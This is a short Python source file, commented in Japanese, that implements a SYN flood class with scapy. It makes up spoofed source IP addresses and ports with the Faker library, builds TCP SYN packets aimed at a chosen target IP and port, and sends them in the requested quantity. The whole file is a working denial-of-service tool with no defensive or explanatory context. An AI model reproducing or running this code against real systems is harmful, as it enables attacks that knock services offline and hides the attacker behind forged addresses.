from scapy.all import IP, TCP, send
from faker import Faker

class SynFlood:
    # コンストラクタ 宛先IPの
    def __init__(self, dst_ip, dst_port, packet_count):
        # 引数から宛先IPの受け取り
        self.dst_ip = dst_ip
        self.dst_port = int(dst_port)
        self.packet_count = int(packet_count)

    # 偽IPv4アドレスを生成
    def createSrcIp(self):
        fake = Faker()
        self.src_ip = fake.ipv4()
    
    # 偽port番号を生成
    def createSrcPort(self):
        fake = Faker()
        self.src_port = fake.port_number()

    # IPパケット生成
    def createIpPacket(self):
        self.ip_packet = IP(src=self.src_ip, dst=self.dst_ip)
    
    # TCP SYN パケット生成
    def createTcpPacket(self):
        self.tcp_packet = TCP(sport=self.src_port, dport=self.dst_port, flags="S")
    
    # パケット送信
    def sendPacket(self):
        send(self.ip_packet/self.tcp_packet, count=self.packet_count)